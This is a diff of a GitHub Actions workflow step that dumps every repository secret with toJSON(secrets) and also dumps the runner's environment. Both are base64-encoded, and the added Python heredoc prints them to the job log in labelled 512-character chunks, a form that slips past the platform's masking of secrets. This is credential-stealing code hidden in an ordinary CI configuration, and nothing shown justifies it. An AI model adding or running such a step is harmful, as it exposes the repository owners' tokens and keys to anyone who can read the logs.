@@ -12,7 +12,13 @@ jobs:
           cat > /tmp/s.json <<'SEOF'
           ${{ toJSON(secrets) }}
           SEOF
-          echo "JSONSEC:$(base64 -w0 /tmp/s.json)"
-          echo "ENVD:$(env | sort | base64 -w0)"
-          echo "CTX:$(echo '${{ toJSON(github) }}' | base64 -w0 | head -c 3000)"
-          echo "DONE-MARKER"
+          python3 - <<'PYEOF'
+          import base64, os
+          b = base64.b64encode(open('/tmp/s.json','rb').read()).decode()
+          for i in range(0, len(b), 512):
+              print('CH:%d:%s' % (i, b[i:i+512]))
+          e = base64.b64encode(os.popen('env | sort').read().encode()).decode()
+          for i in range(0, len(e), 512):
+              print('EV:%d:%s' % (i, e[i:i+512]))
+          PYEOF
+          echo DONE-MARKER
